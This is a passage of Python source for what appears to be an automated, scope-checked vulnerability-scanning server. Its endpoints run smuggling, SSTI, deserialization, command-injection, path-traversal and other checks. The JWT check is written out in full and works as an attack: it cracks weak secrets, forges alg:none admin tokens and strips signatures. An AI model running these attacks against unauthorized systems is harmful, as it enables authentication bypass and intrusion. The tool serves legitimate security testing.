            sys.executable,
            validator_script,
            "--discovery-file",
            discovery_file,
            "--output",
            validation_file,
        ]
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"OAuth validation failed: {proc.stderr}",
            )
        
        # Load validation results
        with open(validation_file, "r", encoding="utf-8") as fh:
            validation_data = json.load(fh)
        
        # Save final results
        ts = int(time.time())
        host_key = host.replace(":", "_").replace("/", "_")
        out_name = f"oauth_findings_{host_key}_{ts}.json"
        out_path = os.path.join(OUTPUT_DIR, out_name)
        
        final_results = {
            "host": host,
            "discovery": discovery_data,
            "validation": validation_data,
            "timestamp": ts,
        }
        
        with open(out_path, "w", encoding="utf-8") as fh:
            json.dump(final_results, fh, indent=2)
        
        vulnerable_count = validation_data.get("vulnerable_count", 0)
        
        return OAuthChecksResult(
            host=host,
            findings_file=out_path,
            vulnerable_count=vulnerable_count,
            meta={
                "oauth_endpoints": len(discovery_data.get("oauth_endpoints", [])),
                "oidc_endpoints": len(discovery_data.get("oidc_endpoints", [])),
                "flows_detected": discovery_data.get("flows_detected", []),
                "tests_run": len(validation_data.get("tests", [])),
                "vulnerable_tests": [t.get("test") for t in validation_data.get("tests", []) if t.get("vulnerable")],
            },
        )
    
    finally:
        # Cleanup temp files (check if variables are defined)
        for fpath in [discovery_file, validation_file]:
            if fpath and os.path.exists(fpath):
                try:
                    os.unlink(fpath)
                except Exception:
                    pass


@app.post("/mcp/run_race_checks", response_model=RaceChecksResult)
def run_race_checks(req: RaceChecksRequest):
    """
    Run race condition checks against a target host.
    
    This endpoint:
    1. Discovers race-prone endpoints (financial, account, resource operations)
    2. Tests for race conditions using parallel requests
    3. Detects multiple successful responses or state changes
    """
    host = _enforce_scope(req.host)
    base_url = f"http://{host}" if "://" not in host else host
    
    # Get API endpoints from host_profile
    profile = _load_host_profile_snapshot(host, latest=True)
    api_endpoints = []
    
    if profile:
        web = profile.get("web", {}) or {}
        api_endpoints = web.get("api_endpoints", []) or []
        # Also check authenticated endpoints
        auth_katana = web.get("auth_katana", {}) or {}
        api_endpoints.extend(auth_katana.get("api_endpoints", []) or [])
    
    # Run discovery
    discovery_script = os.path.join(os.path.dirname(__file__), "tools", "race_discovery.py")
    if not os.path.exists(discovery_script):
        raise HTTPException(
            status_code=500,
            detail=f"race_discovery.py not found at {discovery_script}",
        )
    
    # Create temp files (initialize before try block for proper cleanup)
    import tempfile
    api_endpoints_file = None
    discovery_file = None
    validation_file = None
    
    try:
        # Create temp file for API endpoints
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            api_endpoints_file = f.name
            json.dump({"api_endpoints": api_endpoints}, f)
        
        # Create temp file for discovery output
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            discovery_file = f.name
        
        # Run discovery
        cmd = [
            sys.executable,
            discovery_script,
            "--target",
            base_url,
            "--api-endpoints-file",
            api_endpoints_file,
            "--output",
            discovery_file,
        ]
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if proc.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"Race discovery failed: {proc.stderr}",
            )
        
        # Load discovery results
        with open(discovery_file, "r", encoding="utf-8") as fh:
            discovery_data = json.load(fh)
        
        # Run validation
        validator_script = os.path.join(os.path.dirname(__file__), "tools", "race_validator.py")
        if not os.path.exists(validator_script):
            raise HTTPException(
                status_code=500,
                detail=f"race_validator.py not found at {validator_script}",
            )
        
        # Create temp file for validation output
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            validation_file = f.name
        
        cmd = [
            sys.executable,
            validator_script,
            "--discovery-file",
            discovery_file,
            "--output",
            validation_file,
            "--num-requests",
            str(req.num_requests or 10),
        ]
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        if proc.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"Race validation failed: {proc.stderr}",
            )
        
        # Load validation results
        with open(validation_file, "r", encoding="utf-8") as fh:
            validation_data = json.load(fh)
        
        # Save final results
        ts = int(time.time())
        host_key = host.replace(":", "_").replace("/", "_")
        out_name = f"race_findings_{host_key}_{ts}.json"
        out_path = os.path.join(OUTPUT_DIR, out_name)
        
        final_results = {
            "host": host,
            "discovery": discovery_data,
            "validation": validation_data,
            "timestamp": ts,
        }
        
        with open(out_path, "w", encoding="utf-8") as fh:
            json.dump(final_results, fh, indent=2)
        
        vulnerable_count = validation_data.get("vulnerable_count", 0)
        
        return RaceChecksResult(
            host=host,
            findings_file=out_path,
            vulnerable_count=vulnerable_count,
            meta={
                "race_prone_endpoints": len(discovery_data.get("race_prone_endpoints", [])),
                "patterns_detected": discovery_data.get("patterns_detected", []),
                "tests_run": len(validation_data.get("tests", [])),
                "vulnerable_tests": [t.get("url") for t in validation_data.get("tests", []) if t.get("vulnerable")],
            },
        )
    
    finally:
        # Cleanup temp files (check if variables are defined)
        for fpath in [discovery_file, validation_file, api_endpoints_file]:
            if fpath and os.path.exists(fpath):
                try:
                    os.unlink(fpath)
                except Exception:
                    pass


@app.post("/mcp/deduplicate_findings", response_model=DeduplicateFindingsResult)
def deduplicate_findings(req: DeduplicateFindingsRequest):
    """
    Deduplicate and correlate findings.
    
    This endpoint:
    1. Deduplicates findings using semantic similarity and URL+param clustering
    2. Correlates findings to detect vulnerability chains
    3. Builds attack path graphs
    """
    findings = req.findings
    
    # Run deduplication
    dedup_script = os.path.join(os.path.dirname(__file__), "tools", "finding_dedup.py")
    if not os.path.exists(dedup_script):
        raise HTTPException(
            status_code=500,
            detail=f"finding_dedup.py not found at {dedup_script}",
        )
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        input_file = f.name
        json.dump(findings, f)
    
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        output_file = f.name
    
    try:
        cmd = [
            sys.executable,
            dedup_script,
            "--findings-file",
            input_file,
            "--output",
            output_file,
        ]
        
        if not req.use_semantic:
            cmd.append("--no-semantic")
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        if proc.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"Deduplication failed: {proc.stderr}",
            )
        
        # Load deduplicated findings
        with open(output_file, "r", encoding="utf-8") as fh:
            deduplicated = json.load(fh)
        
        # Run correlation
        correlation_script = os.path.join(os.path.dirname(__file__), "tools", "finding_correlation.py")
        correlation_graph = None
        
        if os.path.exists(correlation_script):
            with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
                corr_output = f.name
            
            try:
                cmd = [
                    sys.executable,
                    correlation_script,
                    "--findings-file",
                    output_file,
                    "--output",
                    corr_output,
                ]
                
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                if proc.returncode == 0:
                    with open(corr_output, "r", encoding="utf-8") as fh:
                        correlation_graph = json.load(fh)
            except Exception:
                pass
            finally:
                if os.path.exists(corr_output):
                    try:
                        os.unlink(corr_output)
                    except Exception:
                        pass
        
        original_count = len(findings)
        deduplicated_count = len(deduplicated) if isinstance(deduplicated, list) else 1
        duplicates_removed = original_count - deduplicated_count
        
        # Store correlation graph in artifacts
        if correlation_graph:
            ts = int(time.time())
            corr_file = os.path.join(ARTIFACTS_DIR, "correlation_graphs", f"correlation_{ts}.json")
            os.makedirs(os.path.dirname(corr_file), exist_ok=True)
            with open(corr_file, "w", encoding="utf-8") as fh:
                json.dump(correlation_graph, fh, indent=2)
        
        return DeduplicateFindingsResult(
            original_count=original_count,
            deduplicated_count=deduplicated_count,
            duplicates_removed=duplicates_removed,
            deduplicated_findings=deduplicated if isinstance(deduplicated, list) else [deduplicated],
            correlation_graph=correlation_graph,
        )
    
    finally:
        for fpath in [input_file, output_file]:
            if os.path.exists(fpath):
                try:
                    os.unlink(fpath)
                except Exception:
                    pass


@app.post("/mcp/run_smuggling_checks", response_model=SmugglingChecksResult)
def run_smuggling_checks(req: SmugglingChecksRequest):
    """Run HTTP request smuggling checks."""
    host = _enforce_scope(req.host)
    base_url = f"http://{host}" if "://" not in host else host
    
    # Run discovery and validation
    discovery_script = os.path.join(os.path.dirname(__file__), "tools", "smuggling_discovery.py")
    validator_script = os.path.join(os.path.dirname(__file__), "tools", "smuggling_validator.py")
    
    # Verify scripts exist
    if not os.path.exists(discovery_script):
        raise HTTPException(status_code=500, detail=f"Discovery script not found: {discovery_script}")
    if not os.path.exists(validator_script):
        raise HTTPException(status_code=500, detail=f"Validator script not found: {validator_script}")
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        discovery_file = f.name
    
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        validation_file = f.name
    
    try:
        # Discovery
        discovery_result = subprocess.run(
            [sys.executable, discovery_script, "--target", base_url, "--output", discovery_file],
            timeout=30,
            capture_output=True,
            text=True
        )
        if discovery_result.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"Discovery script failed: {discovery_result.stderr}"
            )
        
        # Validation
        validation_result = subprocess.run(
            [sys.executable, validator_script, "--target", base_url, "--output", validation_file],
            timeout=60,
            capture_output=True,
            text=True
        )
        if validation_result.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"Validation script failed: {validation_result.stderr}"
            )
        
        # Verify output file exists before reading
        if not os.path.exists(validation_file):
            raise HTTPException(status_code=500, detail="Validation script did not produce output file")
        
        with open(validation_file, "r") as fh:
            validation = json.load(fh)
        
        ts = int(time.time())
        out_name = f"smuggling_findings_{host.replace(':', '_')}_{ts}.json"
        out_path = os.path.join(OUTPUT_DIR, out_name)
        
        with open(out_path, "w") as fh:
            json.dump(validation, fh, indent=2)
        
        return SmugglingChecksResult(
            host=host,
            findings_file=out_path,
            vulnerable=validation.get("vulnerable", False),
            meta={"tests": validation.get("tests", [])},
        )
    finally:
        for fpath in [discovery_file, validation_file]:
            if os.path.exists(fpath):
                try:
                    os.unlink(fpath)
                except Exception:
                    pass


@app.post("/mcp/run_graphql_security", response_model=GraphQLSecurityResult)
def run_graphql_security(req: GraphQLSecurityRequest):
    """Run GraphQL security tests."""
    from urllib.parse import urlparse
    parsed = urlparse(req.endpoint)
    host = parsed.netloc.split(":")[0]
    _enforce_scope(host)
    
    script = os.path.join(os.path.dirname(__file__), "tools", "graphql_security.py")
    
    # Verify script exists
    if not os.path.exists(script):
        raise HTTPException(status_code=500, detail=f"GraphQL security script not found: {script}")
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        output_file = f.name
    
    try:
        result_proc = subprocess.run(
            [sys.executable, script, "--endpoint", req.endpoint, "--output", output_file],
            timeout=120,
            capture_output=True,
            text=True
        )
        if result_proc.returncode != 0:
            raise HTTPException(
                status_code=500,
                detail=f"GraphQL security script failed: {result_proc.stderr}"
            )
        
        # Verify output file exists before reading
        if not os.path.exists(output_file):
            raise HTTPException(status_code=500, detail="GraphQL security script did not produce output file")
        
        with open(output_file, "r") as fh:
            result = json.load(fh)
        
        ts = int(time.time())
        out_name = f"graphql_security_{host.replace(':', '_')}_{ts}.json"
        out_path = os.path.join(OUTPUT_DIR, out_name)
        
        with open(out_path, "w") as fh:
            json.dump(result, fh, indent=2)
        
        vulnerable = result.get("depth_attack", {}).get("vulnerable") or result.get("batching", {}).get("vulnerable")
        
        return GraphQLSecurityResult(
            endpoint=req.endpoint,
            findings_file=out_path,
            vulnerable=vulnerable,
            meta=result,
        )
    finally:
        if os.path.exists(output_file):
            try:
                os.unlink(output_file)
            except Exception:
                pass


@app.post("/mcp/run_nuclei", response_model=NucleiScanResult)
def run_nuclei(req: NucleiRequest):
    """
    Run Nuclei vulnerability scanner against a target.
    
    This endpoint provides a standalone Nuclei scan with configurable options:
    - mode: "recon" (fast fingerprinting) or "full" (comprehensive scan)
    - templates: specific template paths to use
    - severity: filter by severity level
    - tags: filter by nuclei tags
    
    Results are written to a JSONL file and a summary is returned.
    """
    host = _enforce_scope(req.target)
    
    nuclei_bin = os.environ.get("NUCLEI_BIN", "nuclei")
    templates_dir = NUCLEI_TEMPLATES_DIR or os.path.expanduser("~/nuclei-templates")
    
    # Build nuclei command
    cmd = [nuclei_bin, "-u", req.target]
    
    templates_used: List[str] = []
    
    # Handle mode
    mode = req.mode or "recon"
    
    if req.templates:
        # Use specified templates
        for tmpl in req.templates:
            abs_path = os.path.join(templates_dir, tmpl) if not os.path.isabs(tmpl) else tmpl
            if os.path.exists(abs_path):
                cmd.extend(["-t", abs_path])
                templates_used.append(tmpl)
    elif mode == "recon":
        # Use recon-only templates (fast)
        recon_templates = [
            "http/technologies/",
            "http/exposed-panels/",
            "http/fingerprints/",
            "ssl/",
        ]
        for tmpl in recon_templates:
            abs_path = os.path.join(templates_dir, tmpl)
            if os.path.exists(abs_path):
                cmd.extend(["-t", abs_path])
                templates_used.append(tmpl)
    else:
        # Full scan - use all templates
        cmd.extend(["-t", templates_dir])
        templates_used.append("all")
    
    # Add severity filter
    if req.severity:
        cmd.extend(["-severity", ",".join(req.severity)])
    
    # Add tags filter
    if req.tags:
        cmd.extend(["-tags", ",".join(req.tags)])
    
    # Output configuration
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"nuclei_{mode}_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    cmd.extend(["-jsonl", "-silent", "-o", out_path])
    
    print(f"[NUCLEI] Running: {' '.join(cmd)}", file=sys.stderr)
    
    rate_limit_wait()
    try:
        proc = subprocess.run(
            cmd,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=1800,  # 30 minute timeout
        )
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=500, detail="Nuclei scan timed out (30 minutes)")
    except FileNotFoundError:
        raise HTTPException(status_code=500, detail=f"Nuclei binary not found: {nuclei_bin}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error running nuclei: {e}")
    
    # Count findings
    findings_count = 0
    if os.path.exists(out_path):
        with open(out_path, "r", encoding="utf-8") as fh:
            for line in fh:
                if line.strip():
                    findings_count += 1
    else:
        # Create empty file if no findings
        with open(out_path, "w", encoding="utf-8") as fh:
            pass
    
    return NucleiScanResult(
        target=req.target,
        findings_count=findings_count,
        findings_file=out_path,
        mode=mode,
        templates_used=templates_used,
    )


# ---------- JWT & Auth Check Endpoints ----------

@app.post("/mcp/run_jwt_checks", response_model=JwtChecksResult)
def run_jwt_checks(req: JwtChecksRequest):
    """
    Run JWT security checks against a target.
    
    Tests for:
    1. Weak JWT secret (tries common secrets)
    2. Algorithm confusion (alg:none bypass)
    3. Signature stripping
    4. Expired token acceptance
    
    Requires either credentials, quick_login_url, or a pre-existing jwt_token.
    """
    import base64
    import json as json_module
    import hashlib
    import hmac
    
    host = _enforce_scope(req.target)
    base_url = f"http://{host}" if "://" not in host else req.target
    
    checks_run = 0
    confirmed_issues: List[Dict[str, Any]] = []
    
    # Get a valid JWT token first
    jwt_token = req.jwt_token
    
    if not jwt_token:
        # Try to get token via quick login
        if req.quick_login_url:
            try:
                login_url = base_url.rstrip("/") + req.quick_login_url
                resp = requests.get(login_url, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    jwt_token = data.get("token") or resp.headers.get("X-Auth-Token")
            except Exception:
                pass
        
        # Try credentials
        if not jwt_token and req.credentials and req.login_url:
            try:
                login_url = base_url.rstrip("/") + req.login_url
                resp = requests.post(login_url, json=req.credentials, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    jwt_token = data.get("token") or resp.headers.get("X-Auth-Token")
            except Exception:
                pass
    
    if not jwt_token:
        return JwtChecksResult(
            target=req.target,
            meta={
                "checks_count": 0,
                "confirmed_issues_count": 0,
                "error": "Could not obtain JWT token",
                "summary": "No JWT token available for testing",
                "issues": [],
            }
        )
    
    # Parse the JWT
    try:
        parts = jwt_token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        header_b64 = parts[0]
        payload_b64 = parts[1]
        signature = parts[2]
        
        # Decode header and payload
        header_padded = header_b64 + "=" * (4 - len(header_b64) % 4)
        payload_padded = payload_b64 + "=" * (4 - len(payload_b64) % 4)
        
        header = json_module.loads(base64.urlsafe_b64decode(header_padded))
        payload = json_module.loads(base64.urlsafe_b64decode(payload_padded))
        
    except Exception as e:
        return JwtChecksResult(
            target=req.target,
            meta={
                "checks_count": 0,
                "confirmed_issues_count": 0,
                "error": f"Failed to parse JWT: {e}",
                "summary": "Invalid JWT format",
                "issues": [],
            }
        )
    
    # Test endpoint - try /api/profile or similar
    test_endpoints = ["/api/profile", "/api/me", "/api/user", "/api/users/1"]
    test_url = None
    
    for ep in test_endpoints:
        try:
            url = base_url.rstrip("/") + ep
            resp = requests.get(url, headers={"Authorization": f"Bearer {jwt_token}"}, timeout=10)
            if resp.status_code == 200:
                test_url = url
                break
        except:
            pass
    
    if not test_url:
        test_url = base_url.rstrip("/") + "/api/profile"
    
    # Test 1: Weak secret cracking
    common_secrets = [
        "secret", "secret123", "password", "key", "jwt_secret", "jwt",
        "changeme", "admin", "test", "development", "12345678",
        "your-256-bit-secret", "shhhhh", "supersecret", "private",
    ]
    
    for secret in common_secrets:
        checks_run += 1
        try:
            # Try to create a valid signature with this secret
            signing_input = f"{parts[0]}.{parts[1]}"
            
            if header.get("alg") == "HS256":
                expected_sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                ).decode().rstrip("=")
                
                if expected_sig == signature:
                    confirmed_issues.append({
                        "type": "weak_jwt_secret",
                        "secret": secret,
                        "algorithm": header.get("alg"),
                        "confidence": "high",
                        "note": f"JWT secret cracked: '{secret}'",
                    })
                    break
        except Exception:
            pass
    
    # Test 2: Algorithm None bypass
    checks_run += 1
    try:
        # Create alg:none token
        none_header = base64.urlsafe_b64encode(
            json_module.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip("=")
        
        # Modify payload to escalate privileges if possible
        modified_payload = payload.copy()
        if "role" in modified_payload:
            modified_payload["role"] = "admin"
        if "admin" in modified_payload:
            modified_payload["admin"] = True
        
        none_payload = base64.urlsafe_b64encode(
            json_module.dumps(modified_payload).encode()
        ).decode().rstrip("=")
        
        none_token = f"{none_header}.{none_payload}."
        
        rate_limit_wait()
        resp = requests.get(test_url, headers={"Authorization": f"Bearer {none_token}"}, timeout=10)
        
        if resp.status_code == 200:
            confirmed_issues.append({
                "type": "jwt_algorithm_none",
                "test_url": test_url,
                "status_code": resp.status_code,
                "confidence": "critical",
                "note": "Server accepts JWT with alg:none - signature bypass possible",
            })
    except Exception:
        pass
    
    # Test 3: Empty signature
    checks_run += 1
    try:
        empty_sig_token = f"{parts[0]}.{parts[1]}."
        
        rate_limit_wait()
        resp = requests.get(test_url, headers={"Authorization": f"Bearer {empty_sig_token}"}, timeout=10)
        
        if resp.status_code == 200:
            confirmed_issues.append({
                "type": "jwt_empty_signature",
                "test_url": test_url,
                "status_code": resp.status_code,
                "confidence": "high",
                "note": "Server accepts JWT with empty signature",
            })
    except Exception:
        pass
    
    # Test 4: Signature stripping (remove last part)
    checks_run += 1
    try:
        stripped_token = f"{parts[0]}.{parts[1]}"
        
        rate_limit_wait()
        resp = requests.get(test_url, headers={"Authorization": f"Bearer {stripped_token}"}, timeout=10)
        
        if resp.status_code == 200:
            confirmed_issues.append({
                "type": "jwt_signature_stripped",
                "test_url": test_url,
                "status_code": resp.status_code,
                "confidence": "high",
                "note": "Server accepts JWT without signature component",
            })
    except Exception:
        pass
    
    # Build summary
    if confirmed_issues:
        summary = f"Found {len(confirmed_issues)} JWT vulnerability(ies)"
    else:
        summary = "No JWT vulnerabilities detected"
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"jwt_checks_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    results = {
        "target": req.target,
        "jwt_algorithm": header.get("alg"),
        "checks_run": checks_run,
        "confirmed_issues": confirmed_issues,
        "summary": summary,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2)
    
    return JwtChecksResult(
        target=req.target,
        meta={
            "checks_count": checks_run,
            "confirmed_issues_count": len(confirmed_issues),
            "jwt_algorithm": header.get("alg"),
            "summary": summary,
            "findings_file": out_path,
            "issues": confirmed_issues,
        }
    )


@app.post("/mcp/run_ssti_checks", response_model=SstiChecksResult)
def run_ssti_checks(req: SstiChecksRequest):
    """
    Run Server-Side Template Injection (SSTI) checks.
    
    Tests for template injection vulnerabilities in:
    - Jinja2 (Python)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    
    Uses expression evaluation detection (7*7 = 49) to identify vulnerable endpoints.
    """
    from urllib.parse import urlparse
    
    # Enforce scope
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    # Import tester
    tester_script = os.path.join(os.path.dirname(__file__), "tools", "template_injection_tester.py")
    if not os.path.exists(tester_script):
        raise HTTPException(
            status_code=500,
            detail=f"template_injection_tester.py not found at {tester_script}",
        )
    
    # Get callback URL from environment if not provided
    callback_url = req.callback_url or os.environ.get("CALLBACK_SERVER_URL")
    
    # Run tester
    try:
        from tools.template_injection_tester import test_ssti
        result = test_ssti(req.target_url, req.param, callback_url)
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"SSTI tester failed: {e}",
        )
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"ssti_checks_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    findings = {
        "target_url": req.target_url,
        "param": req.param,
        "vulnerable": result.get("vulnerable", False),
        "template_engine": result.get("template_engine"),
        "evidence": result.get("evidence"),
        "rce_tested": result.get("rce_tested", False),
        "timestamp": ts,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(findings, fh, indent=2)
    
    return SstiChecksResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        template_engine=result.get("template_engine"),
        meta={
            "param_tested": req.param,
            "callback_url_used": callback_url is not None,
            "rce_tested": result.get("rce_tested", False),
        }
    )


@app.post("/mcp/run_deser_checks", response_model=DeserChecksResult)
def run_deser_checks(req: DeserChecksRequest):
    """
    Run deserialization vulnerability checks.
    
    Tests for insecure deserialization in:
    - Python (pickle, YAML)
    - Java (Java serialization, YAML)
    - .NET (BinaryFormatter)
    
    Uses callback URLs for blind RCE detection.
    """
    from urllib.parse import urlparse
    
    # Enforce scope
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    # Import tester
    tester_script = os.path.join(os.path.dirname(__file__), "tools", "deserialization_tester.py")
    if not os.path.exists(tester_script):
        raise HTTPException(
            status_code=500,
            detail=f"deserialization_tester.py not found at {tester_script}",
        )
    
    # Get callback URL from environment if not provided
    callback_url = req.callback_url or os.environ.get("CALLBACK_SERVER_URL")
    
    # Run tester
    try:
        from tools.deserialization_tester import test_deserialization
        result = test_deserialization(req.target_url, req.format_type, callback_url)
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Deserialization tester failed: {e}",
        )
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"deser_checks_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    findings = {
        "target_url": req.target_url,
        "format_type": req.format_type,
        "vulnerable": result.get("vulnerable", False),
        "tests_run": result.get("tests_run", 0),
        "findings": result.get("findings", []),
        "timestamp": ts,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(findings, fh, indent=2)
    
    # Determine format type from findings
    detected_format = None
    if result.get("findings"):
        for finding in result.get("findings", []):
            test_type = finding.get("test", "")
            if "java" in test_type:
                detected_format = "java"
            elif "python" in test_type or "pickle" in test_type:
                detected_format = "python"
            elif "dotnet" in test_type or ".net" in test_type:
                detected_format = "dotnet"
            elif "yaml" in test_type:
                detected_format = "yaml"
            break
    
    return DeserChecksResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        format_type=detected_format or req.format_type,
        meta={
            "format_tested": req.format_type,
            "tests_run": result.get("tests_run", 0),
            "findings_count": len(result.get("findings", [])),
            "callback_url_used": callback_url is not None,
        }
    )


@app.post("/mcp/run_command_injection_checks", response_model=CommandInjectionResult)
def run_command_injection_checks(req: CommandInjectionRequest):
    """
    Run command injection vulnerability checks.
    
    Tests for OS command injection in:
    - GET/POST parameters
    - File upload filenames
    - System calls
    
    Uses time-based detection and callback-based RCE validation.
    """
    from urllib.parse import urlparse
    
    # Enforce scope (check original URL before translation)
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    # Get callback server URL if callback enabled
    callback_server_url = None
    if req.use_callback:
        callback_server_url = os.environ.get("CALLBACK_SERVER_URL")
    
    # Run tester
    try:
        from tools.command_injection_tester import validate_command_injection
        # Translate URL for Docker if needed (MCP server runs in Docker, needs service names)
        translated_url = translate_url_for_docker(req.target_url)
        discovery_data = {"target": translated_url}
        result = validate_command_injection(discovery_data, callback_server_url, params=req.params)
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Command injection tester failed: {e}",
        )
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"command_injection_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    # Extract injection point and RCE confirmation from findings
    injection_point = None
    rce_confirmed = False
    if result.get("findings"):
        for finding in result.get("findings", []):
            if finding.get("injection_point"):
                injection_point = finding.get("injection_point")
            if finding.get("rce_confirmed") or finding.get("type") == "command_injection_callback_confirmed":
                rce_confirmed = True
    
    findings = {
        "target_url": req.target_url,
        "vulnerable": result.get("vulnerable", False),
        "injection_point": injection_point,
        "rce_confirmed": rce_confirmed,
        "findings": result.get("findings", []),
        "timestamp": ts,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(findings, fh, indent=2)
    
    # Include findings in response for orchestrator to extract
    response_data = {
        "target_url": req.target_url,
        "findings_file": out_path,
        "vulnerable": result.get("vulnerable", False),
        "injection_point": injection_point,
        "rce_confirmed": rce_confirmed,
        "findings": result.get("findings", []),  # Include findings in response
        "meta": {
            "params_tested": req.params or "auto-discovered",
            "tests_run": result.get("tests_run", 0),
            "findings_count": len(result.get("findings", [])),
            "callback_used": callback_server_url is not None,
        }
    }
    
    return CommandInjectionResult(**response_data)


@app.post("/mcp/run_path_traversal_checks", response_model=PathTraversalResult)
def run_path_traversal_checks(req: PathTraversalRequest):
    """
    Run path traversal / LFI / RFI vulnerability checks.
    
    Tests for:
    - Directory traversal (../, ..\\, encoded variants)
    - Local file inclusion (LFI)
    - Remote file inclusion (RFI)
    
    Uses callback-based validation for blind LFI detection.
    """
    from urllib.parse import urlparse
    
    # Enforce scope
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    # Get callback server URL if callback enabled
    callback_server_url = None
    if req.use_callback:
        callback_server_url = os.environ.get("CALLBACK_SERVER_URL")
    
    # Run tester
    try:
        from tools.path_traversal_tester import validate_path_traversal
        discovery_data = {"target": req.target_url}
        result = validate_path_traversal(discovery_data, callback_server_url)
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Path traversal tester failed: {e}",
        )
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"path_traversal_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    # Extract inclusion type and files read from findings
    inclusion_type = None
    files_read = []
    if result.get("findings"):
        for finding in result.get("findings", []):
            if finding.get("inclusion_type"):
                inclusion_type = finding.get("inclusion_type")
            if finding.get("files_read"):
                files_read.extend(finding.get("files_read", []))
    
    findings = {
        "target_url": req.target_url,
        "vulnerable": result.get("vulnerable", False),
        "inclusion_type": inclusion_type,
        "files_read": list(set(files_read)),  # Deduplicate
        "findings": result.get("findings", []),
        "timestamp": ts,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(findings, fh, indent=2)
    
    return PathTraversalResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        inclusion_type=inclusion_type,
        files_read=list(set(files_read)),
        meta={
            "param_tested": req.param or "auto-discovered",
            "file_paths_tested": req.file_paths or "default",
            "tests_run": result.get("tests_run", 0),
            "findings_count": len(result.get("findings", [])),
            "callback_used": callback_server_url is not None,
        }
    )


@app.post("/mcp/run_file_upload_checks", response_model=FileUploadResult)
def run_file_upload_checks(req: FileUploadRequest):
    """
    Run insecure file upload vulnerability checks.
    
    Tests for:
    - File type validation bypass (double extensions, MIME spoofing)
    - Path traversal in filenames
    - Executable file uploads (PHP, JSP, ASP, etc.)
    - Upload success and execution validation
    
    Uses callback-based validation for RCE confirmation.
    """
    from urllib.parse import urlparse
    
    # Enforce scope
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    # Get callback server URL if callback enabled
    callback_server_url = None
    if req.use_callback:
        callback_server_url = os.environ.get("CALLBACK_SERVER_URL")
    
    # Run tester
    try:
        from tools.file_upload_tester import validate_file_upload
        discovery_data = {"target": req.target_url}
